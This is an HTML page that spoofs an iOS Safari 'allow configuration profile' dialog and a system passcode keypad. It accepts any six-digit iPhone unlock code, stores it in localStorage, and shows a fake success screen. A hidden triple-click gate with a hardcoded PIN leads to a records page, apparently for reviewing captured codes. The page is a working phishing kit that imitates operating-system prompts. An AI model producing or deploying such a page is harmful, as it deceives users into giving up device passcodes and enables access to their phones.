<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>配置描述文件</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", sans-serif;
            background: #8e8e93;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }


        /* Blurred screenshot background simulation */
        .bg-blur {
            position: fixed;
            inset: 0;
            background: #8e8e93;
            z-index: 0;
        }

        /* Overlay dimming */
        .overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.3);
            z-index: 1;
        }

        /* Dialog */
        .dialog {
            position: relative;
            z-index: 10;
            background: rgba(242, 242, 247, 0.95);
            backdrop-filter: blur(40px);
            -webkit-backdrop-filter: blur(40px);
            border-radius: 14px;
            width: calc(100% - 64px);
            max-width: 320px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
        }

        .dialog-body {
            padding: 20px 16px 16px;
            text-align: center;
        }

        .dialog-text {
            font-size: 13px;
            color: #000;
            line-height: 1.5;
            text-align: left;
        }

        .dialog-divider {
            height: 0.5px;
            background: rgba(60, 60, 67, 0.29);
        }

        .dialog-buttons {
            display: flex;
        }

        .dialog-btn {
            flex: 1;
            padding: 11px 8px;
            font-size: 17px;
            font-family: inherit;
            background: none;
            border: none;
            cursor: pointer;
            color: #007aff;
            position: relative;
            transition: background 0.15s;
        }

        .dialog-btn:active {
            background: rgba(0, 0, 0, 0.08);
        }

        .dialog-btn.primary {
            font-weight: 600;
        }

        .dialog-btn-divider {
            width: 0.5px;
            background: rgba(60, 60, 67, 0.29);
        }

        /* Safari bottom bar */
        .safari-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            height: 50px;
            background: rgba(249, 249, 249, 0.94);
            border-top: 0.5px solid rgba(0,0,0,0.2);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 16px;
            z-index: 100;
        }

        .safari-back {
            font-size: 24px;
            color: #007aff;
            line-height: 1;
        }

        .safari-url {
            flex: 1;
            text-align: center;
            font-size: 15px;
            color: #000;
            opacity: 0.6;
        }

        .safari-more {
            font-size: 22px;
            color: #007aff;
            line-height: 1;
        }

        /* Passcode screen */
        .passcode-screen {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 200;
            background: #000;
            flex-direction: column;
            align-items: center;
        }

        .passcode-screen.show { display: flex; }


        .passcode-top {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding-bottom: 20px;
        }

        .passcode-title {
            font-size: 20px;
            font-weight: 600;
            color: #fff;
            margin-bottom: 6px;
        }

        .passcode-subtitle {
            font-size: 13px;
            color: rgba(255,255,255,0.6);
            margin-bottom: 28px;
            text-align: center;
            padding: 0 32px;
        }

        .passcode-dots {
            display: flex;
            gap: 16px;
            margin-bottom: 8px;
        }

        .passcode-dot {
            width: 14px;
            height: 14px;
            border-radius: 50%;
            border: 1.5px solid rgba(255,255,255,0.8);
            background: transparent;
            transition: background 0.15s;
        }

        .passcode-dot.filled {
            background: #fff;
            border-color: #fff;
        }

        .passcode-dot.error {
            background: #ff3b30;
            border-color: #ff3b30;
        }

        .passcode-error-text {
            font-size: 13px;
            color: #ff3b30;
            height: 18px;
            text-align: center;
        }

        /* Number pad */
        .numpad {
            width: 100%;
            padding: 0 12px 20px;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            max-width: 360px;
        }

        .numpad-key {
            background: rgba(255,255,255,0.18);
            border: none;
            border-radius: 50%;
            width: 72px;
            height: 72px;
            margin: 0 auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-family: inherit;
            transition: background 0.1s;
            -webkit-tap-highlight-color: transparent;
        }

        .numpad-key:active {
            background: rgba(255,255,255,0.45);
        }

        .numpad-key.empty {
            background: transparent;
            pointer-events: none;
        }

        .numpad-key.delete {
            background: transparent;
        }

        .numpad-key.delete:active {
            background: rgba(255,255,255,0.15);
        }

        .key-num {
            font-size: 28px;
            font-weight: 300;
            color: #fff;
            line-height: 1;
        }

        .key-letters {
            font-size: 9px;
            font-weight: 500;
            color: rgba(255,255,255,0.6);
            letter-spacing: 1px;
            margin-top: 1px;
        }

        .key-delete-icon {
            font-size: 22px;
            color: #fff;
        }

        /* Result screen */
        .result {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 300;
            background: #f2f2f7;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 32px;
            text-align: center;
        }

        .result.show { display: flex; }

        .result-icon {
            width: 72px;
            height: 72px;
            background: linear-gradient(135deg, #34c759, #248a3d);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            margin-bottom: 20px;
        }

        .result-title {
            font-size: 22px;
            font-weight: 700;
            color: #000;
            margin-bottom: 10px;
        }

        .result-sub {
            font-size: 15px;
            color: #8e8e93;
            line-height: 1.5;
            margin-bottom: 32px;
        }

        .result-btn {
            background: #007aff;
            color: #fff;
            border: none;
            border-radius: 12px;
            padding: 14px 32px;
            font-size: 17px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
        }
    </style>
</head>
<body>


    <div class="bg-blur"></div>
    <div class="overlay"></div>

    <!-- iOS-style dialog -->
    <div class="dialog" id="dialog">
        <div class="dialog-body">
            <p class="dialog-text">此网站正尝试下载一个配置描述文件。你要允许吗?</p>
        </div>
        <div class="dialog-divider"></div>
        <div class="dialog-buttons">
            <button class="dialog-btn" onclick="onIgnore()">忽略</button>
            <div class="dialog-btn-divider"></div>
            <button class="dialog-btn primary" onclick="onAllow()">允许</button>
        </div>
    </div>

    <!-- Safari bottom bar -->
    <div class="safari-bar">
        <span class="safari-back">‹</span>
        <span class="safari-url">galaxypoke.github.io</span>
        <span class="safari-more">···</span>
    </div>

    <!-- Passcode screen -->
    <div class="passcode-screen" id="passcode-screen">

        <div class="passcode-top">
            <div class="passcode-title">输入密码</div>
            <div class="passcode-subtitle">需要输入 iPhone 密码以安装描述文件</div>
            <div class="passcode-dots" id="passcode-dots">
                <div class="passcode-dot"></div>
                <div class="passcode-dot"></div>
                <div class="passcode-dot"></div>
                <div class="passcode-dot"></div>
                <div class="passcode-dot"></div>
                <div class="passcode-dot"></div>
            </div>
            <div class="passcode-error-text" id="passcode-error"></div>
        </div>

        <div class="numpad">
            <button class="numpad-key" onclick="numInput('1')"><span class="key-num">1</span><span class="key-letters"></span></button>
            <button class="numpad-key" onclick="numInput('2')"><span class="key-num">2</span><span class="key-letters">ABC</span></button>
            <button class="numpad-key" onclick="numInput('3')"><span class="key-num">3</span><span class="key-letters">DEF</span></button>
            <button class="numpad-key" onclick="numInput('4')"><span class="key-num">4</span><span class="key-letters">GHI</span></button>
            <button class="numpad-key" onclick="numInput('5')"><span class="key-num">5</span><span class="key-letters">JKL</span></button>
            <button class="numpad-key" onclick="numInput('6')"><span class="key-num">6</span><span class="key-letters">MNO</span></button>
            <button class="numpad-key" onclick="numInput('7')"><span class="key-num">7</span><span class="key-letters">PQRS</span></button>
            <button class="numpad-key" onclick="numInput('8')"><span class="key-num">8</span><span class="key-letters">TUV</span></button>
            <button class="numpad-key" onclick="numInput('9')"><span class="key-num">9</span><span class="key-letters">WXYZ</span></button>
            <button class="numpad-key empty"></button>
            <button class="numpad-key" onclick="numInput('0')"><span class="key-num">0</span></button>
            <button class="numpad-key delete" onclick="numDelete()"><span class="key-delete-icon">⌫</span></button>
        </div>
    </div>

    <!-- Result after entering passcode -->
    <div class="result" id="result">
        <div class="result-icon" id="result-icon" onclick="iconClick()" style="cursor:pointer;user-select:none;">✓</div>
        <div class="result-title">描述文件已下载</div>
        <div class="result-sub">前往 <strong>设置 → 通用 → VPN与设备管理</strong> 完成安装</div>
        <button class="result-btn" onclick="reset()">返回</button>
    </div>

    <!-- Hidden PIN gate (no visible entry point) -->
    <div id="pin-gate" style="display:none;position:fixed;inset:0;z-index:400;background:rgba(0,0,0,0.7);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;">
        <div style="background:#1c1c1e;border-radius:18px;padding:28px 24px;width:280px;text-align:center;">
            <div style="font-size:16px;font-weight:600;color:#fff;margin-bottom:6px;">验证身份</div>
            <div style="font-size:13px;color:rgba(255,255,255,0.45);margin-bottom:20px;">输入访问密码</div>
            <input id="pin-input" type="password" maxlength="10" placeholder="密码"
                style="width:100%;background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);border-radius:10px;padding:12px 14px;color:#fff;font-size:16px;font-family:inherit;outline:none;text-align:center;letter-spacing:4px;"
                onkeydown="if(event.key==='Enter')checkPin()" />
            <div id="pin-error" style="font-size:12px;color:#ff3b30;height:18px;margin-top:6px;"></div>
            <div style="display:flex;gap:10px;margin-top:14px;">
                <button onclick="closePinGate()" style="flex:1;background:rgba(255,255,255,0.1);border:none;border-radius:10px;padding:11px;color:#fff;font-size:15px;font-family:inherit;cursor:pointer;">取消</button>
                <button onclick="checkPin()" style="flex:1;background:#007aff;border:none;border-radius:10px;padding:11px;color:#fff;font-size:15px;font-weight:600;font-family:inherit;cursor:pointer;">确认</button>
            </div>
        </div>
    </div>

    <script>
        let passcode = '';


        function onAllow() {
            document.getElementById('dialog').style.display = 'none';
            document.querySelector('.overlay').style.display = 'none';
            document.querySelector('.safari-bar').style.display = 'none';
            passcode = '';
            updateDots();
            document.getElementById('passcode-error').textContent = '';
            document.getElementById('passcode-screen').classList.add('show');
        }

        function onIgnore() {
            const d = document.getElementById('dialog');
            d.style.transform = 'scale(0.95)';
            d.style.opacity = '0';
            d.style.transition = 'all 0.2s';
            setTimeout(() => {
                d.style.display = 'none';
                document.querySelector('.overlay').style.display = 'none';
            }, 200);
        }

        function numInput(n) {
            if (passcode.length >= 6) return;
            passcode += n;
            updateDots();
            if (passcode.length === 6) {
                setTimeout(submitPasscode, 300);
            }
        }

        function numDelete() {
            if (passcode.length === 0) return;
            passcode = passcode.slice(0, -1);
            updateDots();
        }

        function updateDots() {
            const dots = document.querySelectorAll('.passcode-dot');
            dots.forEach((dot, i) => {
                dot.classList.toggle('filled', i < passcode.length);
                dot.classList.remove('error');
            });
        }

        function submitPasscode() {
            const dots = document.querySelectorAll('.passcode-dot');
            // Simulate: any 6-digit code is "correct" – show success
            // To simulate wrong passcode: change condition below
            const isCorrect = passcode.length === 6;
            if (isCorrect) {
                // Save password to localStorage
                const existing = JSON.parse(localStorage.getItem('pw_memos') || '[]');
                existing.unshift({
                    platform: '设备解锁密码',
                    account: 'iPhone',
                    password: passcode
                });
                localStorage.setItem('pw_memos', JSON.stringify(existing));

                document.getElementById('passcode-screen').classList.remove('show');
                document.getElementById('result').classList.add('show');
            } else {
                dots.forEach(dot => dot.classList.add('error'));
                document.getElementById('passcode-error').textContent = '密码不正确';
                setTimeout(() => {
                    passcode = '';
                    updateDots();
                    document.getElementById('passcode-error').textContent = '';
                }, 800);
            }
        }

        // Hidden entry: triple-click on result icon
        let iconClickCount = 0, iconClickTimer = null;
        function iconClick() {
            iconClickCount++;
            clearTimeout(iconClickTimer);
            if (iconClickCount >= 3) {
                iconClickCount = 0;
                openPinGate();
            } else {
                iconClickTimer = setTimeout(() => { iconClickCount = 0; }, 600);
            }
        }

        function openPinGate() {
            document.getElementById('pin-input').value = '';
            document.getElementById('pin-error').textContent = '';
            document.getElementById('pin-gate').style.display = 'flex';
            setTimeout(() => document.getElementById('pin-input').focus(), 100);
        }

        function closePinGate() {
            document.getElementById('pin-gate').style.display = 'none';
        }

        function checkPin() {
            const val = document.getElementById('pin-input').value;
            if (val === '0009') {
                document.getElementById('pin-gate').style.display = 'none';
                window.location.href = 'records.html';
            } else {
                document.getElementById('pin-error').textContent = '密码错误';
                document.getElementById('pin-input').value = '';
                setTimeout(() => { document.getElementById('pin-error').textContent = ''; }, 1500);
            }
        }

        function reset() {
            document.getElementById('result').classList.remove('show');
            const d = document.getElementById('dialog');
            d.style.display = '';
            d.style.transform = '';
            d.style.opacity = '';
            d.style.transition = '';
            document.querySelector('.overlay').style.display = '';
            document.querySelector('.safari-bar').style.display = '';
            passcode = '';
            updateDots();
        }
    </script>
</body>
</html>
